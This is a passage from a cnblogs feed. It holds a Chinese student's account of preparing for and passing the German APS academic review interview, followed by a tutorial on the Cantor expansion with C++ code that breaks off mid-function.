&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_6&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9753645.html&quot;&gt;Digitale Logik&lt;/a&gt;（数字逻辑）&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_7&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9748101.html&quot;&gt;Physik&lt;/a&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;（大学物理）&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_8&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9741833.html&quot;&gt;Betriebssystem&lt;/a&gt;（操作系统）&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_9&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9734416.html&quot;&gt;Abschlussarbeit:Konstruktion und Implementierung von Dota2 Datenbank Intelligent Verwaltungsplatfom&lt;/a&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;（毕业设计：Dota2资料库智能管理平台）&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_10&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9722358.html&quot;&gt;Softwaretechnik&lt;/a&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;（软件工程）&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_11&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9720296.html&quot;&gt;Android Anwendungsprogramm Entwicklung&lt;/a&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;（安卓应用开发）&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_12&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9700821.html&quot;&gt;Prinzipien der Computer Zusammensetzung&lt;/a&gt;（计算机组成原理）&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_13&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9693404.html&quot;&gt;Wahrscheinlichkeitstheorie und mathematische Statistik&lt;/a&gt;（概率论与数理统计）&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_14&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9688559.html&quot;&gt;Training Logisches Denken&lt;/a&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;（逻辑思维训练）&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_15&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9687626.html&quot;&gt;An Introduction to Computer Thinking&lt;/a&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;（计算机思维导论）&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_16&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9660847.html&quot;&gt;Compiler Principle&lt;/a&gt;（编译原理）&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_17&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9645565.html&quot;&gt;Lineare Algebra&lt;/a&gt;（线性代数）&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_18&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9634662.html&quot;&gt;Mathematik&lt;/a&gt;（高等数学）&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;CategoryEntryList1_EntryStoryList_ctl00_Entries_TitleUrl_19&quot; class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/Java-Starter/p/9617494.html&quot;&gt;Datenstruktur und Algorithmus（&lt;/a&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;数据结构与算法）&lt;/span&gt;&lt;/p&gt;

&lt;h3&gt;&lt;span class=&quot;entrylistItemTitle&quot;&gt;2.2 附录&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;C++语法基础和数据结构：&lt;a href=&quot;https://github.com/cjy513203427/C_Program_Base&quot; target=&quot;_blank&quot;&gt;https://github.com/cjy513203427/C_Program_Base&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;毕业设计源码已开源：&lt;a href=&quot;https://github.com/cjy513203427/Dota2_Databank&quot; target=&quot;_blank&quot;&gt;https://github.com/cjy513203427/Dota2_Databank&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;3.APS审核复习流程&lt;/h2&gt;
&lt;h3&gt;3.1 个人背景&lt;/h3&gt;
&lt;h4&gt;2.1 学习情况&lt;/h4&gt;
&lt;p&gt;国内双非本科计算机科学与技术专业，绩点2.84（大学贪玩，挂过一些科目，导致绩点不高），2018年6月毕业&lt;/p&gt;
&lt;h4&gt;2.2 家庭情况&lt;/h4&gt;
&lt;p&gt;末流二线城市中产阶级，我个人想去美国读CS，可惜家里经济条件不允许，所以我选择了性价比高的德国教育&lt;/p&gt;
&lt;h3&gt;3.2 审核进度概要&lt;/h3&gt;
&lt;p&gt;2018.9.10 提交材料&lt;/p&gt;
&lt;p&gt;2018.9.25 出审核号&lt;/p&gt;
&lt;p&gt;2019.01.08 审核部打电话通知我去审核&lt;/p&gt;
&lt;p&gt;2019.02.11下午一点审核&lt;/p&gt;
&lt;h3&gt;3.3 复习技巧&lt;/h3&gt;
&lt;p&gt;我负责任的告诉即将审核的同学和计划提交材料审核的同学，APS的准备时间至少是&lt;span&gt;两个月&lt;span&gt;，这两个月是集中准备时间，保证高强度，一天至少花六个小时在APS上面，准备时间一定程度上因人而异，如本科期间很认真，绩点很高，复习起来就快；像我这样挂过不少科的，就要一天花至少六个小时。请不要听信有些审核过的同学说一个星期或者几天就可以准备APS，这是不负责任的，如果你相信这些说法，准备个两三天去审核，很大可能挂掉。接下来你要等待三个月才能提交补审申请，准备二审。因为，语言的磨合就至少需要一个月的时间，翻看几十门专业课程需要更多的时间，APS和考研最大的不同就是没有考试范围，每一门课都有可能被问到。对于审核语言，大多数同学选择走英审，求稳，有语言基础，专业词汇方便查阅；如果你的德语达到了B2水平，大可去尝试德语审核，通过用审核官的母语与审核官交流，给审核官留下好印象。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;我本科毕业后没有找工作，我从2018八月份下旬开始集中复习（处于探索阶段），前期我用中文总结APS科目，然后再翻译成德语，后来我发现这么做效率低下，不利于记忆，会导致我用中文思维思考问题，要利用好维基百科，维基百科是我获取德语资料的利器&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201453/201902/1201453-20190215205002143-1282823473.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;到了九月份开始递交材料，并用德语在博客园上做APS的课程总结。到了十月份我把二十门课程总结完毕，进入了复习瓶颈期，自我感觉良好，随时能去审核，但是审核部迟迟没有动静。后来我在家实在呆不下去，十月份去找了工作，利用晚上的时间去图书馆花半小时背诵APS，在图书馆我也会看些专业课方面的书籍，这期间我自学了8086汇编语言、又刷了数据结构和机器学习相关的内容。总结地来说，&lt;span&gt;八九月份我是在集中高强度复习，从2018十月份下旬开始到2019二月份是放养式复习&lt;/span&gt;，反复地背诵。我总结出博客之后，为了背诵方便，我将博客的内容放到Word，打印成两本资料，周一到周五晚上花半小时温习背诵之。偶尔我遇到知识点不熟，我会拿出手机搜索自己的博客查缺补漏，放在互联网上的好处就是，随处可查。&lt;/p&gt;
&lt;p&gt;复习科目以专业课为主，基础课为辅，将课程梳理出目录和框架，层层递进，不要求你对这门课每个章节每个具体的知识点都知道，因为APS面谈时间只有二十分钟，你不可能说得完，你要做的是，把这门课经典的知识点总结出来，什么叫“经典的知识点”？，就是你学过这门课必会的知识点，即用两三个知识点证明你学过这门课程。审核官的目的审核你的成绩单上面的成绩是否真实可信，并非是对这门学科严格的测试，所以你不需要知识点面面俱到。&lt;/p&gt;
&lt;p&gt;以下摘自APS官网&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;请注意：&lt;/strong&gt;审核部请您理解，一般来说审核部的面谈时间不能更改！特殊情况可以更改面谈时间，但是必须出具相应的书面证明。申请人必须在约定的面谈时间到来之前跟审核部取得联系，提供相应证明。面谈语言为英语或者德语，或者德英双语。申请人自由选择面谈的语言。申请人提供的语言证明可以帮助考官判断申请人的语言能力。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;审核面谈将检查申请人是否真的具有专业知识，是否真的学过成绩单上出具的课程。从这个角度来讲，审核面谈&lt;span&gt;既不是专业考核，也不是语言考试&lt;/span&gt;。面谈涉及申请人所学的专业和具体课程。申请人不必将学过的知识全部忆述出来，但仍需要证明所学习过的课程，能描述具体的专业课内容，会运用或者将所学展示出来。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;我以计算机网络课程为例，要准备五层协议、三次握手等知识点；&lt;/p&gt;
&lt;p&gt;再以操作系统课程为例，进程状态转换、死锁的形成和预防、CPU调度等知识点；&lt;/p&gt;
&lt;p&gt;其余课程可以参考我分享的德审资料。&lt;/p&gt;

&lt;p&gt;当我把所有课程准备完毕，我列举了思维导图，我推荐使用Xmind，画思维导图可以加深你对学科的理解和学科间的相互关系，极大提高了我的复习效率，我可以通过思维导图去列举一个学科的知识点，复习起来也很方便，复习的时候，先在大脑里回忆知识点，再详细叙述知识点，一个知识点准备至少一个例子，把书从厚读薄就是这个道理。当你在审核的时候说到学科间相互联系，审核官会对你刮目相看，审核官想在最短的时间挖你老底，看你到底学了什么，你通过一个知识点一下子说了两个学科，审核官会认为，你对专业的理解非常深刻。比如离散数学的图论和数据结构与算法的图放在一起说，最小生成树、单源最短路径，DFS，BFS，克鲁斯卡尔和普里姆算法放在一起比较着叙述；再如计算机组成原理的总线异步通信的全互锁和计算机网络运输层TCP三次握手相关联。&lt;/p&gt;

&lt;p&gt;以下摘自APS官网&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;em&gt;复习一遍成绩单提到的科目，着重复习其中最重要的内容。您不需要为了审核面谈再学习任何专业知识，您也不用回忆起所学的全部课程内容！针对审核面谈的准备班尤其&lt;span&gt;没有意义&lt;/span&gt;。&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;请您确保您已了解以您申请的审核语言进行翻译的所有课程名称。&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;您可以在审核面谈中用德语或英语，又或者用两种语言陈述您所学过的大学课程。但不能用汉语！您的德语或英语水平应该达到能够理解考官的问题，回答考官的问题，并且能够简短的介绍自己所学的科目。&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;仔细听考官的问题，并回答他的问题，如果您没有听懂他的话，可以请求他重复一遍问题或解释一下问题。&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;尽量只回答提出的问题。请记住，您只有20分钟的时间来展示自己。&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;请您具体的讲述您在课上都做了些什么和都学了些什么。举出例子。您可以用&lt;span&gt;绘画，图表，表格，公式和方程式&lt;/span&gt;表述您的课程。您只是不该沉默！&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;请您千万不要只给出泛泛的定义和&lt;span&gt;不要背诵&lt;/span&gt;您之前准备的知识，而您本身并不理解它。&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;4.APS审核经历&lt;/h2&gt;
&lt;p&gt;2019年1月8号，我提前预定了德国中心附近的如家酒店，2月10日入住。离德国中心有七百多米的路程。&lt;/p&gt;
&lt;p&gt;2月10号上午九点多从合肥出发，和高中同学一起去上海，他去上海上班。中午十二点到达上海虹桥。下午我本来打算去德国中心熟悉下环境，耐不住高中同学的盛情款待，下午三点和他一起吃了肯德基，去他租住的地方参观，然后打了四五把星际争霸2天梯，到六点我从他那里坐地铁到张江高科。下地铁，入住酒店。由于下午三点吃饭不饿，我在如家酒店周围转了转，慢条斯理地走到德国中心，下图是德国中心夜景&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201453/201902/1201453-20190215222318247-222066600.jpg&quot; alt=&quot;&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;回来的路上，在全家超市购买了方便面和第二天（二月十一号）的早饭，因为二月十号是初六，好多店面没有开门，晚上回去吃了泡面。回酒店百无聊赖，于是和德国朋友在微信上练习口语一个小时，熟悉语言环境。大概晚上九点钟就没事情做了，我把SpringMVC的流程图默写了一遍，又看了下思维导图，此时我发现，再看具体的知识点已经力不从心，内容太多，只能根据思维导图的目录来回忆。十点钟我开始刷头条、看B站游戏视频，因为第二天下午一点才审核，可以睡个懒觉，我到晚上十二点半才睡觉。&lt;/p&gt;
&lt;p&gt;第二天睡到九点醒，我拿出思维导图，在默默地回忆学科的知识点和学科交叉关系，于是又看B站视频了，上午十一点五十退房。慢慢悠悠地走到审核部。&lt;/p&gt;
&lt;p&gt;审核部外景图如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201453/201902/1201453-20190215223030197-44363829.jpg&quot; alt=&quot;&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201453/201902/1201453-20190215223052734-596366492.jpg&quot; alt=&quot;&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;进入德国中心，审核教室在619-620室，我发现我是第一个到的，在室内闲逛&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201453/201902/1201453-20190215223338728-2027109775.jpg&quot; alt=&quot;&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我发现我是第一个来的，等到十二点半，陆续来了一起审核的小伙伴，加上我四个人，和他们闲聊，一位是同济计算机专业的帅哥，走英审、一位是上交计算机专业的帅哥，走英审，和我一样，都是2018年毕业的，还有一位同济德语专业大四的小妹妹，走德审。我们互相鼓励，相谈盛欢，互相加了微信。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201453/201902/1201453-20190215231826779-1875646518.jpg&quot; alt=&quot;&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下图是审核教室，我来早了，还没开门&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201453/201902/1201453-20190215225939778-1667519669.jpg&quot; alt=&quot;&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;到了一点半，我们进入了审核教室，先拿着身份证去拍照，作为身份认证。后来办公人员（中国人）让我们签保密协议，就是讲审核内容不可以对外界泄露。先是同济帅哥被审核官叫去审核，第二位就到我了。审核官问我用什么语言审核，我说用德语，审核官说&quot;Sehr gut&quot;，主审让我把包和衣服寄存起来，通信设备全部上交。审核官把我带进了小黑屋去做笔试题，我犯了失误，用“du”称呼了审核官，审核官提醒我用&quot;Sie&quot;，还好没酿成大错。笔试时间二十分钟。接着主审核官带我进入了审核教室。审核教室坐着俩人，左边是副审，负责记笔记，右边是主审，负责盘问我，两位都是德国老爷爷。主审笑着怼我，问了我一些专业课问题和一门基础课。面谈时间过得好快，二十分钟就这么结束了。&lt;/p&gt;
&lt;p&gt;由于签了保密协议，我不方便泄露审核具体内容。我可以说说大致方向，我看了主审老爷爷用荧光笔圈了我的几门课，都是我&lt;span&gt;挂过的课和取得高分的课&lt;/span&gt;。&lt;/p&gt;

&lt;p&gt;2019年2月14日，我在APS官网查到了结果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201453/201902/1201453-20190215232227126-1995676920.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;4.参考&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://baike.baidu.com/item/APS/19680714?fr=aladdin&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;https://baike.baidu.com/item/APS/19680714?fr=aladdin&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://www.aps.org.cn/zh/verfahren-und-services-deutschland/chinaverfahren/interview&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;https://www.aps.org.cn/zh/verfahren-und-services-deutschland/chinaverfahren/interview&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 15 Feb 2019 15:45:00 +0000</pubDate>
<dc:creator>Rest探路者</dc:creator>
<og:description>1.APS是什么 德国驻华使馆文化处留德人员审核部（简称APS）成立于2001年7月，是由德国驻华使馆文化处和德意志学术交流中心（DAAD）在北京共同合作成立的服务机构。 APS是中国学生前往德国留学</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Java-Starter/p/10385600.html</dc:identifier>
</item>
<item>
<title>【模板】康托展开 - Fugtemypt</title>
<link>http://www.cnblogs.com/YSFAC/p/10386201.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/YSFAC/p/10386201.html</guid>
<description>&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;strong&gt;本文所有的排名均是从第0名开始。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;康托展开：&lt;/p&gt;
&lt;p&gt;已知一个$1—n$的排列$A=\{a_1,a_2,\cdots,a_n\}$，求它在所有排列中的字典序排名。&lt;/p&gt;
&lt;p&gt;常用于将$n$个全排列映射到$n!$个自然数中。&lt;/p&gt;

&lt;p&gt;求解这个问题的思路大概是下面这样的：&lt;/p&gt;
&lt;p&gt;$(1)$ $A$的排名=字典序小于$A$的排列个数。所以只需要知道有多少个排列比$A$小就好了w&lt;/p&gt;
&lt;p&gt;$(2)$ 我们按位考虑，第一位小于$a_1$的所有排列肯定比$A$小，这部分有$(a_{1}-1)\times (n-1)!$个。&lt;/p&gt;
&lt;p&gt;$(3)$ 在第一个数等于$a_1$的所有排列中，第二位小于$a_2$的所有排列也肯定比$A$小。&lt;/p&gt;
&lt;p&gt;　   那么这部分有$(a_{2}-1)\times (n-2)!$个对不对？&lt;/p&gt;
&lt;p&gt;　   但是这个时候出现了一个问题：&lt;/p&gt;
&lt;p&gt;　   如果$a_{1}&amp;lt;a_{2}$，那么第二位就不能再用$a_1$这个数了（因为是排列）。&lt;/p&gt;
&lt;p&gt;　   所以应该有$(a_{2}-2)\times (n-2)!$个。&lt;/p&gt;
&lt;p&gt;　   当然如果$a_{1}&amp;gt;a_{2}$就不需要额外$-1$了w&lt;/p&gt;
&lt;p&gt;$(4)$ 现在我们把$(3)$的结论推广，&lt;/p&gt;
&lt;p&gt;　   前$i-1$位与$A$相同且第$i$位小于$A$的排列，共有$(a_{i}-cnt_{i}-1)\times (n-i)!$个。&lt;/p&gt;
&lt;p&gt;　   其中$cnt_i$表示$\{a_{1},a_{2},\cdots ,a_{i-1}\}$中小于$a_i$的个数。&lt;/p&gt;
&lt;p&gt;　   显然所有这样的排列加起来就是比$A$小的排列总数（有序统计）。&lt;/p&gt;
&lt;p&gt;$(5)$ 注意到$a_{i}-cnt_{i}-1$还等于后$\{a_{i},a_{i+1},\cdots ,a_{n}\}$中小于$a_i$的个数（因为是排列……）。&lt;/p&gt;
&lt;p&gt;　   所以我们就得到了康托展开公式：&lt;/p&gt;
&lt;p&gt;　   $Rank_{A}=b_{n}\times (n-1)!+b_{n-1}\times (n-2)!+\cdots +b_1 \times 0!$&lt;/p&gt;
&lt;p&gt;　   其中$b_{i}$表示$a_i$在当前未出现的$a$中排在第几个。&lt;/p&gt;

&lt;p&gt;关于实现，只需要按定义模拟即可。&lt;/p&gt;
&lt;p&gt;代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
inline &lt;span&gt;int&lt;/span&gt;&lt;span&gt; Cantor(){
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; rank=&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=&lt;span&gt;1&lt;/span&gt;;i&amp;lt;=N;i++&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; s=&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; j=i+&lt;span&gt;1&lt;/span&gt;;j&amp;lt;=N;j++&lt;span&gt;)
            s&lt;/span&gt;+=(A[j]&amp;lt;&lt;span&gt;A[i]);
        rank&lt;/span&gt;+=s*jc[N-&lt;span&gt;i];
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; rank;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;hr/&gt;
&lt;p&gt;逆康托展开：&lt;/p&gt;
&lt;p&gt;和上面相反，已知某排列的排名$x$，求这个排列。&lt;/p&gt;

&lt;p&gt;解决思路基本没区别（说是相反也行）：&lt;/p&gt;
&lt;p&gt;假设我们现在要求$a_i$的值，首先可以得到$b_i=x\div (n-i)!$。&lt;/p&gt;
&lt;p&gt;那么也就是知道了$a_i$在当前未出现过的$a$中的排名。&lt;/p&gt;
&lt;p&gt;但仅仅知道这个不能直接计算，所以我们还要记录一下前$i-1$位出现过的$a$。&lt;/p&gt;
&lt;p&gt;然后$O(n)$枚举求出答案。&lt;/p&gt;

&lt;p&gt;下面是一个例子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/966171/201902/966171-20190215233708767-213118793.png&quot; alt=&quot;&quot; width=&quot;330&quot; height=&quot;72&quot;/&gt;&lt;/p&gt;
&lt;p&gt;此时$n=8,i=4$，前$3$位出现了$1,4,6$。&lt;/p&gt;
&lt;p&gt;假设$b_i=3$，那么$a_i$在未出现的数里排名第$3$。&lt;/p&gt;
&lt;p&gt;由于排名是从$0$开始的，$a_i$就是灰色的第$4$个数$7$。&lt;/p&gt;

&lt;p&gt;代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
inline &lt;span&gt;void&lt;/span&gt; inv_Cantor(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; x){
    memset(vis,&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;sizeof&lt;/span&gt;&lt;span&gt;(vis));
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=&lt;span&gt;1&lt;/span&gt;;i&amp;lt;=N;i++&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; tp=x/jc[N-&lt;span&gt;i];
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; j=&lt;span&gt;1&lt;/span&gt;;j&amp;lt;=N;j++&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(vis[j]) &lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
             &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(tp==&lt;span&gt;0&lt;/span&gt;&lt;span&gt;){
                 vis[j]&lt;/span&gt;=&lt;span&gt;1&lt;/span&gt;,A[i]=&lt;span&gt;j;
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
            } tp&lt;/span&gt;--&lt;span&gt;;
        }
        x&lt;/span&gt;=x%jc[N-&lt;span&gt;i];
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;hr/&gt;
&lt;p&gt;模板题目：&lt;a href=&quot;https://loj.ac/problem/10027&quot; target=&quot;_blank&quot;&gt;loj10027&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;代码：（&lt;strong&gt;这题的排名是从1开始的&lt;/strong&gt;）&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;67&quot;&gt;
&lt;pre&gt;
#include&amp;lt;algorithm&amp;gt;&lt;span&gt;
#include&lt;/span&gt;&amp;lt;iostream&amp;gt;&lt;span&gt;
#include&lt;/span&gt;&amp;lt;cstring&amp;gt;&lt;span&gt;
#include&lt;/span&gt;&amp;lt;cstdio&amp;gt;&lt;span&gt;
#include&lt;/span&gt;&amp;lt;queue&amp;gt;

&lt;span&gt;using&lt;/span&gt; &lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; std;
&lt;/span&gt;&lt;span&gt;#define&lt;/span&gt; MAXN 10
&lt;span&gt;#define&lt;/span&gt; MAXM 1000005
&lt;span&gt;#define&lt;/span&gt; INF 0x7fffffff
&lt;span&gt;#define&lt;/span&gt; ll long long&lt;span&gt;

inline &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; read(){
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; x=&lt;span&gt;0&lt;/span&gt;,f=&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; c=&lt;span&gt;getchar();
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(;!isdigit(c);c=&lt;span&gt;getchar())
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(c==&lt;span&gt;'&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
            f&lt;/span&gt;=-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(;isdigit(c);c=&lt;span&gt;getchar())
        x&lt;/span&gt;=x*&lt;span&gt;10&lt;/span&gt;+c-&lt;span&gt;'&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; x*&lt;span&gt;f;
}

&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; N=&lt;span&gt;8&lt;/span&gt;&lt;span&gt;,dis[MAXM],com[MAXM];
&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; jc[MAXN],A[MAXN],last[MAXM];
&lt;/span&gt;&lt;span&gt;bool&lt;/span&gt;&lt;span&gt; vis[MAXM],vvis[MAXN];

inline &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; Cantor(){
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; rank=&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=&lt;span&gt;1&lt;/span&gt;;i&amp;lt;=N;i++&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; s=&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; j=i+&lt;span&gt;1&lt;/span&gt;;j&amp;lt;=N;j++&lt;span&gt;)
            s&lt;/span&gt;+=(A[j]&amp;lt;&lt;span&gt;A[i]);
        rank&lt;/span&gt;+=s*jc[N-&lt;span&gt;i];
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; rank+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
}

inline &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; inv_Cantor(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; x){
    x&lt;/span&gt;-=&lt;span&gt;1&lt;/span&gt;; memset(vvis,&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;sizeof&lt;/span&gt;&lt;span&gt;(vvis));
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=&lt;span&gt;1&lt;/span&gt;;i&amp;lt;=N;i++&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; tp=x/jc[N-&lt;span&gt;i];
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; j=&lt;span&gt;1&lt;/span&gt;;j&amp;lt;=N;j++&lt;span&gt;){
